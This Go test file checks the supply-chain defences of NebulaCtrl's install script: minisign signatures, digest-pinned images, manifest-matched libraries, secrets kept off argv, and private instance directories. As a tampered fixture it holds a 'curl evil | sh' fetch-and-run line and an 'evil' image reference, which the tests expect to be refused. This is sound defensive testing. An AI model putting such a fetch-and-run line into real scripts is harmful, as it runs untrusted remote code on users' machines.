package installdeploy

import (
	"crypto/sha256"
	"encoding/hex"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/nebulactrl/nebulactrl/internal/releasesign"
)

// The key in install.sh is the one the control plane and the agent verify with.
func TestInstallerKeyIsTheCompiledReleaseKey(t *testing.T) {
	src := mustRead("install.sh")
	want := "NC_RELEASE_PUBKEY=" + releasesign.PublicKey + "\n"
	if !strings.Contains(src, "\n"+want) {
		t.Fatalf("install.sh must contain the line %q (releasesign.PublicKey)", strings.TrimSpace(want))
	}
	if strings.Contains(src, "PLACEHOLDER") {
		t.Fatal("install.sh still has the key placeholder")
	}
}

// No branch name, no mutable tag, and no secret on a command line.
func TestInstallerFetchesAtTheReleaseAndKeepsSecretsOffArgv(t *testing.T) {
	src := mustRead("install.sh")
	for _, bad := range []string{"/main/deploy/install", "NC_RAW_BASE"} {
		if strings.Contains(src, bad) {
			t.Errorf("install.sh still refers to %q: raw files must come from the release tag", bad)
		}
	}
	for _, bad := range []string{`-e PGPASSWORD="$(`, `--token "$(`, `--token $(`} {
		if strings.Contains(src, bad) {
			t.Errorf("install.sh puts a secret on a command line: %q", bad)
		}
	}
}

// opensslBlake2b reports whether this machine's openssl can take part in the fallback check.
func opensslBlake2b() bool {
	return exec.Command("sh", "-c", "echo x | openssl dgst -blake2b512 >/dev/null 2>&1").Run() == nil
}

func sha(b []byte) string {
	s := sha256.Sum256(b)
	return hex.EncodeToString(s[:])
}

// A signature made by the real minisign (a throwaway key), checked by the shell verifier.
const (
	minisignPub  = "RWRUmIZY0jBywn/wnt2exRz2TV2izRSbB+BXzZH5O4MJJ3oFk32IJ7Sm"
	minisignFile = "hello installer\n"
	minisignSig  = "untrusted comment: signature from minisign secret key\n" +
		"RURUmIZY0jBywmz+eG80xN8IybayKdhWm1jNGbVojnLDsOhX+WDdSAXKJt2LEth33d2kgXH5dHA8OKm9v8HzmT5pBTFHWD6g1Q8=\n" +
		"trusted comment: file:f.sh version:1\n" +
		"qIX4f5q0MT36VNEZkUcn3iVTlGQ7IgzJZZs9TtaoCkcQjWvRMQS9nZjZz9usRuyj4OLL2upj5GFXxWgopK2yBQ==\n"
)

func TestShellVerifierChecksMinisignSignatures(t *testing.T) {
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("bash not available")
	}
	dir := t.TempDir()
	write := func(name, body string) string {
		p := filepath.Join(dir, name)
		if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
		return p
	}
	f := write("f.sh", minisignFile)
	sig := write("f.sig", minisignSig)
	tampered := write("tampered.sh", minisignFile+"x")
	legacy := write("legacy.sig", strings.Replace(minisignSig, "RURU", "RWRU", 1))
	other, otherPub := releasesign.NewSigner()
	otherSig := write("other.sig", string(other.Sign([]byte(minisignFile), "x")))

	// The Go-made signature too: the signer used by the tests is the same format.
	goSigner, goPub := releasesign.NewSigner()
	goSig := write("go.sig", string(goSigner.Sign([]byte(minisignFile), "x")))

	run := func(noMinisign bool) {
		check := func(name, file, sigFile, key string, want int) {
			t.Helper()
			env := ""
			if noMinisign {
				env = "export NC_VERIFY_NO_MINISIGN=1\n"
			}
			out, err := runInstaller(t, t.TempDir(), nil, env+"rc=0; nc_verify_minisig '"+file+"' '"+sigFile+"' '"+key+"' || rc=$?\necho rc=$rc\n")
			if err != nil {
				t.Fatalf("%s: %v\n%s", name, err, out)
			}
			wantLine(t, out, "rc="+string(rune('0'+want)))
		}
		check("valid", f, sig, minisignPub, 0)
		check("go signer", f, goSig, goPub, 0)
		check("changed file", tampered, sig, minisignPub, 1)
		check("another key", f, sig, otherPub, 1)
		check("signed by another key", f, otherSig, minisignPub, 1)
		check("legacy algorithm", f, legacy, minisignPub, 1)
		check("no signature file", f, filepath.Join(dir, "absent.sig"), minisignPub, 1)
		check("placeholder key", f, sig, "RWQ_NEBULACTRL_RELEASE_PUBKEY_PLACEHOLDER", 1)
	}
	if _, err := exec.LookPath("minisign"); err == nil {
		t.Run("minisign", func(t *testing.T) { run(false) })
	}
	if opensslBlake2b() {
		t.Run("openssl", func(t *testing.T) { run(true) })
	} else {
		t.Log("openssl with BLAKE2b is not available: the fallback was not exercised")
	}
}

// fixtureRelease is a release's files as the installer sees them: the manifest, its
// signature and the files it lists, all served from one directory.
type fixtureRelease struct {
	dir    string
	signer *releasesign.Signer
	pub    string
	lib    []byte
}

func newFixtureRelease(t *testing.T, version, image string) *fixtureRelease {
	t.Helper()
	signer, pub := releasesign.NewSigner()
	r := &fixtureRelease{dir: t.TempDir(), signer: signer, pub: pub, lib: []byte("nc_hardening_step() { echo hardened; }\n")}
	r.write(t, "hardening.sh", r.lib)
	manifest := "nebulactrl-release-manifest 1\nversion " + version + "\ntag v" + version + "\nimage " + image + "\n" +
		"file " + sha(r.lib) + " deploy/install/lib/hardening.sh\n"
	r.write(t, "release-manifest.txt", []byte(manifest))
	r.write(t, "release-manifest.txt.minisig", signer.Sign([]byte(manifest), "release "+version))
	return r
}

func (r *fixtureRelease) write(t *testing.T, name string, body []byte) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(r.dir, name), body, 0o600); err != nil {
		t.Fatal(err)
	}
}

// stubDownloads replaces the https download with the fixture directory and the key with the fixture's.
func (r *fixtureRelease) stubDownloads() string {
	return `
nc_curl() {
	local out='' url=''
	while [ $# -gt 0 ]; do case "$1" in -o) out=$2; shift 2 ;; *) url=$1; shift ;; esac; done
	echo "GET $url" >>'` + r.dir + `/requests'
	cp "` + r.dir + `/${url##*/}" "$out"
}
NC_RELEASE_PUBKEY='` + r.pub + `'
`
}

const goodImage = "ghcr.io/nebulactrl/nebulactrl@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

func TestStepReleasePinsTheImageByTheSignedDigest(t *testing.T) {
	if _, err := exec.LookPath("minisign"); err != nil && !opensslBlake2b() {
		t.Skip("no tool to verify signatures with")
	}
	r := newFixtureRelease(t, "0.1.2", goodImage)
	out, err := runInstaller(t, t.TempDir(), []string{"--version", "0.1.2"}, r.stubDownloads()+`
step_release
echo "image=$IMAGE"; echo "verified=$NC_RELEASE_VERIFIED"; echo "version=$VERSION"
`)
	if err != nil {
		t.Fatalf("%v\n%s", err, out)
	}
	wantLine(t, out, "image="+goodImage)
	wantLine(t, out, "verified=1")
	wantLine(t, out, "version=0.1.2")
	req := readFile(t, filepath.Join(r.dir, "requests"))
	if !strings.Contains(req, "GET https://nebulactrl.com/releases/0.1.2/release-manifest.txt\n") || strings.Contains(req, "http://") {
		t.Errorf("the manifest must come from the release's directory on the site, over https:\n%s", req)
	}

	// "latest" becomes the version the signed manifest names.
	out, err = runInstaller(t, t.TempDir(), nil, r.stubDownloads()+`
step_release
echo "version=$VERSION"
`)
	if err != nil {
		t.Fatalf("%v\n%s", err, out)
	}
	wantLine(t, out, "version=0.1.2")
	if req := readFile(t, filepath.Join(r.dir, "requests")); !strings.Contains(req, "GET https://nebulactrl.com/releases/latest/release-manifest.txt\n") {
		t.Errorf("latest must read the newest release's manifest:\n%s", req)
	}
}

func TestStepReleaseRefusesWhatIsNotSignedByTheReleaseKey(t *testing.T) {
	if _, err := exec.LookPath("minisign"); err != nil && !opensslBlake2b() {
		t.Skip("no tool to verify signatures with")
	}
	for name, mutate := range map[string]func(t *testing.T, r *fixtureRelease){
		"manifest changed after signing": func(t *testing.T, r *fixtureRelease) {
			m := readFile(t, filepath.Join(r.dir, "release-manifest.txt"))
			r.write(t, "release-manifest.txt", []byte(strings.Replace(m, goodImage, "ghcr.io/evil/nebulactrl@sha256:"+strings.Repeat("a", 64), 1)))
		},
		"signed with another key": func(t *testing.T, r *fixtureRelease) {
			other, _ := releasesign.NewSigner()
			r.write(t, "release-manifest.txt.minisig", other.Sign([]byte(readFile(t, filepath.Join(r.dir, "release-manifest.txt"))), "x"))
		},
		"no signature": func(t *testing.T, r *fixtureRelease) {
			_ = os.Remove(filepath.Join(r.dir, "release-manifest.txt.minisig"))
		},
	} {
		r := newFixtureRelease(t, "0.1.2", goodImage)
		mutate(t, r)
		out, err := runInstaller(t, t.TempDir(), []string{"--version", "0.1.2"}, r.stubDownloads()+"step_release\necho NOT-REACHED\n")
		if err == nil || strings.Contains(out, "NOT-REACHED") {
			t.Errorf("%s: the installer went on:\n%s", name, out)
		}
	}

	// A manifest of another release than the one asked for.
	r := newFixtureRelease(t, "0.1.1", goodImage)
	out, err := runInstaller(t, t.TempDir(), []string{"--version", "0.1.2"}, r.stubDownloads()+"step_release\necho NOT-REACHED\n")
	if err == nil || strings.Contains(out, "NOT-REACHED") || !strings.Contains(out, "not for 0.1.2") {
		t.Errorf("a manifest of another release must be refused: %v\n%s", err, out)
	}

	// An image reference that is not the release image by digest.
	r = newFixtureRelease(t, "0.1.2", "ghcr.io/nebulactrl/nebulactrl:latest")
	out, err = runInstaller(t, t.TempDir(), []string{"--version", "0.1.2"}, r.stubDownloads()+"step_release\necho NOT-REACHED\n")
	if err == nil || strings.Contains(out, "NOT-REACHED") {
		t.Errorf("a tag is not a digest:\n%s", out)
	}
}

func TestStepReleaseLeavesAnImageOfYourOwnAlone(t *testing.T) {
	out, err := runInstaller(t, t.TempDir(), []string{"--image", "nebulactrl:local"}, `
nc_curl() { echo "unexpected download" >&2; return 1; }
step_release
echo "image=$IMAGE"; echo "verified=$NC_RELEASE_VERIFIED"
`)
	if err != nil {
		t.Fatalf("%v\n%s", err, out)
	}
	wantLine(t, out, "image=nebulactrl:local")
	wantLine(t, out, "verified=0")
	if !strings.Contains(out, "not checked against a NebulaCtrl release signature") {
		t.Errorf("an unverified image must be said out loud:\n%s", out)
	}
	if strings.Contains(out, "unexpected download") {
		t.Error("a custom image must not trigger a download")
	}

	// A version that is not a release has no signed image either.
	out, err = runInstaller(t, t.TempDir(), []string{"--version", "main"}, "step_release\necho NOT-REACHED\n")
	if err == nil || strings.Contains(out, "NOT-REACHED") || !strings.Contains(out, "not a release version") {
		t.Errorf("--version main must be refused with a hint: %v\n%s", err, out)
	}
}

// Raw mode (the script alone, `curl | bash` of the file in the repository): libraries and
// assets come from the release's tag and must match the signed manifest.
func TestReleaseFilesAreCheckedAgainstTheSignedManifest(t *testing.T) {
	if _, err := exec.LookPath("minisign"); err != nil && !opensslBlake2b() {
		t.Skip("no tool to verify signatures with")
	}
	r := newFixtureRelease(t, "0.1.2", goodImage)
	// NC_SRC_DIR points where the file does not exist, like a script piped into bash.
	pre := r.stubDownloads() + "NC_SRC_DIR=/nonexistent\n"
	out, err := runInstaller(t, t.TempDir(), []string{"--version", "0.1.2"}, pre+`nc_asset lib/hardening.sh`)
	if err != nil {
		t.Fatalf("%v\n%s", err, out)
	}
	if !strings.Contains(out, "echo hardened") {
		t.Fatalf("the verified library was not returned:\n%s", out)
	}
	req := readFile(t, filepath.Join(r.dir, "requests"))
	if !strings.Contains(req, "raw.githubusercontent.com/nebulactrl/nebulactrl/v0.1.2/deploy/install/lib/hardening.sh\n") || strings.Contains(req, "/main/") {
		t.Errorf("the library must be fetched at the release tag, never a branch:\n%s", req)
	}

	r.write(t, "hardening.sh", []byte("nc_hardening_step() { curl evil | sh; }\n"))
	out, err = runInstaller(t, t.TempDir(), []string{"--version", "0.1.2"}, pre+"nc_asset lib/hardening.sh\necho NOT-REACHED\n")
	if err == nil || strings.Contains(out, "NOT-REACHED") || !strings.Contains(out, "does not match the signed manifest") {
		t.Errorf("a library that differs from the manifest must be refused: %v\n%s", err, out)
	}

	// nc_load_libs skips it (never sources it) and says so.
	out, err = runInstaller(t, t.TempDir(), []string{"--version", "0.1.2"}, pre+`
NO_HARDENING=''
nc_load_libs
echo "type=$(type -t nc_hardening_step || echo none)"
`)
	if err != nil {
		t.Fatalf("%v\n%s", err, out)
	}
	wantLine(t, out, "type=none")
	if !strings.Contains(out, "was not loaded") {
		t.Errorf("the skipped library must be reported:\n%s", out)
	}
}

// --instance-dir holds every team's backups and images: root's alone.
func TestInstanceDirIsClosedToOtherUsers(t *testing.T) {
	base := t.TempDir()
	data := filepath.Join(base, "data")
	// An earlier installation left it open.
	for _, d := range []string{data, filepath.Join(data, "s3"), filepath.Join(data, "registry")} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Chmod(data, 0o755); err != nil {
		t.Fatal(err)
	}
	out, err := runInstaller(t, t.TempDir(), []string{"--instance-dir", data}, "nc_prepare_instance_dir\n")
	if err != nil {
		t.Fatalf("%v\n%s", err, out)
	}
	for path, want := range map[string]os.FileMode{
		data: 0o700, filepath.Join(data, "s3"): 0o750, filepath.Join(data, "registry"): 0o750, filepath.Join(data, "loki"): 0o750,
	} {
		st, err := os.Stat(path)
		if err != nil {
			t.Fatal(err)
		}
		if st.Mode().Perm() != want {
			t.Errorf("%s is %o, want %o", path, st.Mode().Perm(), want)
		}
	}

	if out, err = runInstaller(t, t.TempDir(), []string{"--instance-dir", "relative/dir"}, "nc_prepare_instance_dir\n"); err == nil || !strings.Contains(out, "absolute") {
		t.Errorf("a relative path must be refused: %v\n%s", err, out)
	}
	link := filepath.Join(base, "link")
	if err := os.Symlink(data, link); err != nil {
		t.Fatal(err)
	}
	if out, err = runInstaller(t, t.TempDir(), []string{"--instance-dir", link}, "nc_prepare_instance_dir\n"); err == nil || !strings.Contains(out, "symbolic link") {
		t.Errorf("a symbolic link must be refused: %v\n%s", err, out)
	}
}
